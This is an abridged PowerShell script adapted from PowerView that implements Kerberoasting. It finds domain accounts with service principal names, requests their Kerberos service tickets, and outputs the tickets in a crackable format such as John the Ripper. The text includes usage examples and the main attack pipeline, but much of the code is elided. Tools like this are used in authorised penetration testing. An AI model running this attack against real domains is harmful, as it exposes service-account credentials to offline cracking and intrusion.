...
<#
    Invoke-AdaptKerberoast.ps1 - Standalone Function
    Based on PowerView by Will Schroeder (@harmj0y)
    Original function: Invoke-AdaptKerberoast
...
# --- Get-AdaptDomainSPNTicket (dependency) ---
function Get-AdaptDomainSPNTicket {
<#
.SYNOPSIS
...
License: BSD 3-Clause  
Required Dependencies: Invoke-AdaptUserImpersonation, Invoke-AdaptRevertToSelf  

.DESCRIPTION

This function will either take one/more SPN strings, or one/more PowerView.User objects
(the output from Get-AdaptDomainUser) and will request a kerberos ticket for the given SPN
...
Specifies a PowerView.User object (result of Get-AdaptDomainUser) to request the ticket for.
...
A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote domain using Invoke-AdaptUserImpersonation.

.EXAMPLE

Get-AdaptDomainSPNTicket -SPN "HTTP/web.testlab.local"

Request a kerberos service ticket for the specified SPN.

.EXAMPLE

"HTTP/web1.testlab.local","HTTP/web2.testlab.local" | Get-AdaptDomainSPNTicket

Request kerberos service tickets for all SPNs passed on the pipeline.

.EXAMPLE

Get-AdaptDomainUser -SPN | Get-AdaptDomainSPNTicket -OutputFormat JTR
    ...
    PROCESS {
        ...
        ForEach ($Object in $TargetObject) {
            ...
            try {
                ...
                Write-Warning "[Get-AdaptDomainSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
            }
            if ($Ticket) {
...
# --- Main Function: Invoke-AdaptKerberoast ---
function Invoke-AdaptKerberoast {
<#
.SYNOPSIS
...
License: BSD 3-Clause  
Required Dependencies: Invoke-AdaptUserImpersonation, Invoke-AdaptRevertToSelf, Get-AdaptDomainUser, Get-AdaptDomainSPNTicket  

.DESCRIPTION

Uses Get-AdaptDomainUser to query for user accounts with non-null service principle
...
Invoke-AdaptKerberoast -Credential $Cred -Verbose -Domain testlab.local | fl
...
#>
    ...
    PROCESS {
        ...
        Get-AdaptDomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-AdaptDomainSPNTicket -OutputFormat $OutputFormat
    }
